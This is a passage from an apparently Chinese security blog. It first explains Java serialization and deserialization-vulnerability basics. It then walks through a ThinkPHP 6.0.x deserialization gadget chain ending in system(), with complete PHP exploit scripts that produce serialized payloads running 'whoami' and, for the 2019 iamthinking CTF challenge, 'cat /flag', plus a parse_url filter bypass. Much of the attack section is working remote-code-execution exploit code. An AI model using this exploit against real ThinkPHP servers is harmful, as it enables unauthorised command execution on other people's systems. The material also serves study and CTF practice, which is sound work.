<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建OutputStream对象</span></span><br><span class="line">OutputStream outputStream= <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;serial&quot;</span>);</span><br><span class="line"><span class="comment">//将其封装到ObjectOutputStream对象中</span></span><br><span class="line">ObjectOutputStream objectOutputStream=<span class="keyword">new</span> ObjectOutputStream((outputStream));</span><br><span class="line"><span class="comment">//此后调用writeObject()对客完成对象的序列化，并将其发送给OutputStream</span></span><br><span class="line">objectOutputStream.writeObject(Object);</span><br><span class="line"><span class="comment">//关闭资源</span></span><br><span class="line">objectOutputStream.close();</span><br><span class="line">outputStream.close();</span><br></pre></td></tr></table></figure>

<p>反序列化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建OutputStream对象</span></span><br><span class="line">InputStream inputStream=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;serial&quot;</span>);</span><br><span class="line"><span class="comment">//将其封装到ObjectInputStream对象中</span></span><br><span class="line">ObjectInputStream objectInputStream=<span class="keyword">new</span> ObjectInputStream((inputStream));</span><br><span class="line"><span class="comment">//只需调用readObject(0即可完成对象的反序列化</span></span><br><span class="line">objectInputStream.readObject();</span><br><span class="line"><span class="comment">//关闭资源</span></span><br><span class="line">objectInputStream.close();</span><br><span class="line">inputStream.close();</span><br></pre></td></tr></table></figure>



<h2 id="Serializable接口"><a href="#Serializable接口" class="headerlink" title="Serializable接口"></a>Serializable接口</h2><p>一般一个类只要继承了Serializable接口，就代表该类和其子类都能进行JDK的序列化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tq;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyJavaSerialize</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">UInfo</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String userName;</span><br><span class="line">        <span class="keyword">private</span>  <span class="keyword">int</span> userAge;</span><br><span class="line">        <span class="keyword">private</span>  String userAddress;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getUserName</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> userName;&#125;;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getUserAge</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> userAge;&#125;;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getUserAddress</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> userAddress;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserName</span><span class="params">(String userName)</span></span>&#123;<span class="keyword">this</span>.userName=userName;&#125;;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserAge</span><span class="params">(<span class="keyword">int</span> userAge)</span></span>&#123;<span class="keyword">this</span>.userAge=userAge;&#125;;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserAddress</span><span class="params">(String userAddress)</span></span>&#123;<span class="keyword">this</span>.userAddress=userAddress;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        UInfo userInfo=<span class="keyword">new</span> UInfo();</span><br><span class="line">        userInfo.setUserAddress(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        userInfo.setUserAge(<span class="number">22</span>);</span><br><span class="line">        userInfo.setUserName(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line"></span><br><span class="line">        OutputStream outputStream=<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;serial&quot;</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream=<span class="keyword">new</span> ObjectOutputStream(outputStream);</span><br><span class="line">        objectOutputStream.writeObject(userInfo);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        InputStream inputStream=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;serial&quot;</span>);</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> ObjectInputStream(inputStream);</span><br><span class="line">        UInfo unserialUInfo=(UInfo) objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        inputStream.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(unserialUInfo.userName);</span><br><span class="line">        System.out.println(unserialUInfo.userAge);</span><br><span class="line">        System.out.println(unserialUInfo.userAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出结果，工程目录下会生成一个serial文件，其内容就是序列化后的数据</p>
<p><img src="https://www.hualigs.cn/image/6073d5c5e3da5.jpg"></p>
<h2 id="Externalizable接口"><a href="#Externalizable接口" class="headerlink" title="Externalizable接口"></a>Externalizable接口</h2><p>除了Serializable接口，java还提供了另一个序列化接口Externalizable，该接口继承自Serializable接口，但是有两个抽象函数：writeExternal和readExternal。需要自行实现两个函数来控制序列化流程，否则目标序列化类属性值会是类初始化后的默认值。</p>
<p>在使用Externalizable接口实现序列化时，读取对象会调用目标序列化类的无参构造函数去创建一个新的对象，再把徐磊话数据中的类属性值分别填充到新对象中。所以实现Externalizable接口的类必须提供一个public属性的无参构造函数</p>
<h2 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="serialVersionUID"></a>serialVersionUID</h2><p>目标序列化类有一个隐藏属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private static final long serialVerionUID</span><br></pre></td></tr></table></figure>

<p>Java虚拟机判断是否允许序列化数据被序列化时，会取决于两个类的serialVersionUID是否一致。serialVerionUID在不同编译器内可能有不同的值，开发者可以在目标序列化类中提供固定值。在提高serialVerionUID固定值的情况下，只要序列化数据中国的serialVerionUID和目标序列化类中的一致就可以成功反序列化。如果没有指定值，编译器会根据class文件内容通过一定算法生成值，在不同环境下，编译器得到的serialVerionUID值不同，就会导致反序列化失败。改变目标类中代码也可能会影响生成的serialVersionUID，此时会抛出java.io.InvalidClassException并指出serialVersionUID不一致。建议在目标序列化类中显示定义serialVersionUID并赋予明确的值。</p>
<p>显示定义serialVersionUID有两种用途：</p>
<p>1.在某些场合，希望类的不同版本兼容序列化，所以需要确保类的不同版本有相同的serialVersionUID</p>
<p>2.某些时候不希望类的不同版本对序列化有兼容，所以需要类的不同版本有不同的serialVerionUID</p>
<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>java有多种序列化和反序列化工具</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JDK自带的Serializable</span><br><span class="line">fastjson和jackson是JSON的知名反序列化工具</span><br><span class="line">xmldecoder和xstream是XML的知名反序列化工具</span><br></pre></td></tr></table></figure>

<p>java拥有完善的第三方类库和满足各种需求的框架，但因为很多第三方类库引用广泛，如果其中某些组件出现安全问题，那么受影响范围将极为广泛。</p>
<h2 id="漏洞入口"><a href="#漏洞入口" class="headerlink" title="漏洞入口"></a>漏洞入口</h2><p>ObjectInputStream对象的readObject函数调用是java反序列化流程的入口，序列化数据的来源包括：Cookie、GET参数、POST参数或者流、HTTP Head或者来自用户可控内容的数据库等。</p>
<p>触发场景：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.HTTP请求中的参数</span><br><span class="line">2.RMI，即Java远程方法调用，在RMI中传输的数据皆为序列化</span><br><span class="line">3.JMX，一个为应用程序植入管理功能的框架</span><br><span class="line">4.自定义协议 用来接收与发送原始的java对象</span><br></pre></td></tr></table></figure>

<p>反序列化相关函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br></pre></td></tr></table></figure>



<h2 id="数据特征"><a href="#数据特征" class="headerlink" title="数据特征"></a>数据特征</h2><p>序列化的数据头是不变的，传输过程中可能会对字节流进行编码，解码后查看字节流开头，反序列化数据开头包含两字节的魔术数字，后面是两字节的版本号，如<code>ac ed 00 05</code>，而经过Base64编码过序列化数据的字节流头部为<code>Ro0AB</code>，在攻击检测时可针对该特征进行匹配请求post中是否包含反序列化数据，判断是否为反序列化漏洞攻击。</p>
<h2 id="利用形式"><a href="#利用形式" class="headerlink" title="利用形式"></a>利用形式</h2><p>JDK原生反序列化工具Serializable大致有两种利用形式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.完整对象前的利用</span><br><span class="line">在JDK对恶意序列化数据进行反序列化的过程中达成攻击效果，这种利用方式大多基于对java开发中频繁调用函数的理解，寻找漏洞触发点。例如commons-collections3.1反序列化漏洞利用中的rce gadget属于以readObject函数调用点为入口，直接在依赖包中寻找到rce的利用方式</span><br><span class="line"></span><br><span class="line">2.生成完整对象的利用</span><br><span class="line">如身份令牌反序列化，要等待对象反序列化完成后，利用其中的函数或者属性值完成攻击</span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-11T07:48:31.000Z" title="2021-04-11T07:48:31.000Z">2021-04-11</time>发表</span><span class="level-item"><time dateTime="2021-04-11T07:57:49.381Z" title="2021-04-11T07:57:49.381Z">2021-04-11</time>更新</span><span class="level-item">9 分钟读完 (大约1318个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/11/Thinkphp6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Thinkphp6.0.x反序列化</a></h1><div class="content"><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>利用链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">think\Model --&gt; __destruct()</span><br><span class="line">think\Model --&gt; save()</span><br><span class="line">think\Model --&gt; updateData()</span><br><span class="line">think\Model --&gt; checkAllowFields()</span><br><span class="line">think\Model --&gt; db()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">后半部分利用链（同tp 5.2后半部分利用链)</span><br><span class="line"></span><br><span class="line">think\model\concern\Conversion --&gt; __toString()</span><br><span class="line">think\model\concern\Conversion --&gt; __toJson()</span><br><span class="line">think\model\concern\Conversion --&gt; __toArray()</span><br><span class="line">think\model\concern\Attribute --&gt; getAttr()</span><br><span class="line">think\model\concern\Attribute --&gt; getValue()</span><br></pre></td></tr></table></figure>



<p>vendor/topthink/think-orm/src/Model.php</p>
<p>Model类中存在<code>__destruct()</code>方法，令<code>$this-&gt;lazySave</code>等于true，调用<code>save()</code>。Model类为抽象类，利用的时候要用它的子类Pivot</p>
<p><img src="https://ae01.alicdn.com/kf/Udb251c41e330455b8fb5097af7b8f1f4l.jpg"></p>
<p>跟进<code>save()</code>函数，触发点位于updateData函数内，首先需要构造参数防止函数直接返回，才能进入updateData()函数</p>
<p><img src="https://ae01.alicdn.com/kf/U7b22f6dd27c7476cb941ac9835abf8c2c.jpg"></p>
<p>需要满足三个条件才能进入<code>updateData()</code>，</p>
<p>1.<code>$this-&gt;exists</code>为true</p>
<p>2.<code>isEmpty()</code>需要返回false，给<code>$this-&gt;data</code>赋值即可</p>
<p><img src="https://ae01.alicdn.com/kf/Ufc13f37c25054146a92fd6bc978387cfY.jpg"></p>
<p>3.<code>trigger()</code>需要返回true，让<code>$this-&gt;withEvent</code>等于false</p>
<p><img src="https://ae01.alicdn.com/kf/U519975bafe3b4ba39b3d4485b2e2558by.jpg"></p>
<p><code>checkAllowFields()</code>触发<code>__toString()</code>，需要构造参数防止提前return，第一个if条件已经满足。第二个if，需要<code>empty($data)</code>等于false<img src="https://ae01.alicdn.com/kf/U6cfffa14ceb744c9aa721e51c943b08fV.jpg"></p>
<p>/vendor/topthink/think-orm/src/model/concern/Attribute.php</p>
<p>跟进getChangeData()方法，让<code>$this-&gt;force</code>和<code>$this-&gt;data</code>都有值就可以</p>
<p><img src="https://ae01.alicdn.com/kf/U8068fa04022e47df9b42d86110a778a8F.jpg"></p>
<p>需要先满足<code>$this-&gt;field</code>为空、<code>$this-&gt;schema</code>为空两个条件才能调用<code>$this-&gt;db()</code></p>
<p><img src="https://ae01.alicdn.com/kf/U2d23332ec7634727b78b56ec0be104b0q.jpg"></p>
<p><code>db()</code>方法中出现了拼接字符串操作，触发<code>__toString()</code>，需要先让<code>$this-&gt;connection</code>等于mysql</p>
<p><img src="https://ae01.alicdn.com/kf/U703843abe7084b8291c72699885cb84eC.jpg"></p>
<p>接下来就是原来tp5的<code>__toString</code>利用链，由于model\concern\Conversion是一个trait复用类，所以只要在Model下use即可</p>
<p>vendor/topthink/think-orm/src/model/concern/Conversion.php</p>
<p>存在<code>__toString()</code>方法，调用<code>toJson()</code></p>
<p><img src="https://ae01.alicdn.com/kf/Ude5942d7801b4bb2a2511f1eca911eb1N.jpg"></p>
<p>跟进<code>toJson()</code>，调用<code>__toArray()</code></p>
<p><img src="https://ae01.alicdn.com/kf/U01245cd69e9d40ae8b3d8675f4f51d81N.jpg"></p>
<p><code>toArray()</code></p>
<p><img src="https://ae01.alicdn.com/kf/U35601ce018cf4d2bafde20e70dff77a7o.jpg"><img src="https://ae01.alicdn.com/kf/U9c2f1cb03dc24b74bfe0ad667bb02a02H.jpg"></p>
<p>vendor/topthink/think-orm/src/model/concern/Attribute.php</p>
<p><code>getAttr()</code>函数，调用getValue()</p>
<p><img src="https://ae01.alicdn.com/kf/U2fe78f342e7542df97e2b458ea4b8b32s.jpg"></p>
<p><code>getData()</code></p>
<p><img src="https://ae01.alicdn.com/kf/Uc4fadcd1d5fe4c539aa5c52b035fb353I.jpg"></p>
<p><code>getRealFieldName()</code>，<code>$this-&gt;strict</code>等于true返回<code>$name</code>，这样<code>getData()</code>方法就会返回<code>$this-&gt;data[$name]</code>。</p>
<p><img src="https://ae01.alicdn.com/kf/U75a107b89387416ea707f9c7aa7f978dJ.jpg"></p>
<p><code>getValue()</code>函数中存在命令执行，当<code>$this-&gt;withAttr[$fieldName]</code>不为数组的时候触发。</p>
<p><img src="https://ae01.alicdn.com/kf/U2ccdaddc20c3418b9ad6e7aabf3667fc1.jpg"></p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Attribute</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">data</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;xxx&quot;</span> =&gt; <span class="string">&quot;system&quot;</span>];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;xxx&quot;</span> =&gt; <span class="string">&quot;whoami&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$force</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$field</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$schema</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;schema = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">//定义this-&gt;data不为空</span></span><br><span class="line">            <span class="built_in">parent</span>::__construct();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> Pivot();</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> Pivot(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>本地测试</p>
<p><img src="https://ae01.alicdn.com/kf/U6147714709d54a8287f0eab71c70632cc.jpg"></p>
<h1 id="安洵杯-2019-iamthinking"><a href="#安洵杯-2019-iamthinking" class="headerlink" title="[安洵杯 2019]iamthinking"></a>[安洵杯 2019]iamthinking</h1><p>存在备份文件<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p><img src="https://ae01.alicdn.com/kf/U9820749315214de0b56df1fdfcfd1972t.jpg"></p>
<p>查看源码得到版本为thinkphp6，查看控制器，发现存在unserialize。过滤了O开头的字符串，可以根据parse_url的特性绕过，在解析形如<code>http://xxx.com///index.php?payload=cmd</code>这样的URI时parse_url会返回false。</p>
<p><img src="https://ae01.alicdn.com/kf/Ubde65ecd0f4c479f965c9d61ce9abe8fC.jpg"></p>
<p>在解析形如<code>http://xxx.com///index.php?payload=cmd</code>这样的URI时parse_url会返回false</p>
<p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Attribute</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">data</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;xxx&quot;</span> =&gt; <span class="string">&quot;system&quot;</span>];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;xxx&quot;</span> =&gt; <span class="string">&quot;cat /flag&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$force</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$field</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$schema</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;schema = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">//定义this-&gt;data不为空</span></span><br><span class="line">            <span class="built_in">parent</span>::__construct();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> Pivot();</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> Pivot(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用反序列化漏洞，得到flag</p>
